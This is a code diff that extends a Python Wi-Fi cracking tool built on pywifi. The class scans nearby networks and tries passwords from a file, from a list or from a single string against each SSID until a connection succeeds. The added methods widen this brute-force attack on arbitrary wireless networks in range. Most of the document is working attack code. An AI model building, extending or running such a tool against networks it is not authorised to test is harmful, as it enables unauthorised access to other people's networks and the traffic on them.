@@ -66,7 +66,7 @@ class MyWifiCrack(object):
         
 
 
-    def run(self, password_filepath):
+    def run_password_filepath(self, password_filepath):
         if self.wifi_connect_status() == 0:
             wifi_lists = self.scan_wifi()
             for every_wifi in wifi_lists:
@@ -75,7 +75,33 @@ class MyWifiCrack(object):
                     while not self.ispassword:
                         self.profile.key = fr.readline()
                         self.connect_wifi()
+                        
 
+    def run_password_lists(self, password_lists):
+        if self.wifi_connect_status() == 0:
+            wifi_lists = self.scan_wifi()
+            for every_wifi in wifi_lists:
+                self.profile.ssid = every_wifi.ssid
+                for pd in password_lists:
+                    self.profile.key = pd
+                    self.connect_wifi()
+                    if self.ispassword:
+                        break
+    
+    def run_password_str(self, password_str, wifi_ssid=''):
+        if self.wifi_connect_status() == 0:
+            if wifi_ssid == '':
+                wifi_lists = self.scan_wifi()
+                for every_wifi in wifi_lists:
+                    self.profile.ssid = every_wifi.ssid
+                    self.profile.key = password_str
+                    self.connect_wifi()
+                    if self.ispassword:
+                        break
+            else:
+                self.profile.ssid = wifi_ssid
+                self.profile.key = password_str
+                self.connect_wifi()
                 
 
 if __name__ == "__main__":
@@ -86,5 +112,6 @@ if __name__ == "__main__":
         profile_obj = pywifi.Profile()
         base_password_filepath = os.path.join(os.path.split(__file__)[0], 'new_password_lists.txt')
         wifi_crack = MyWifiCrack(wireless_obj, profile_obj)
-        wifi_crack.run(base_password_filepath)
-
+        wifi_crack.run_password_filepath(base_password_filepath)
+    else:
+        print('没有无线网卡')
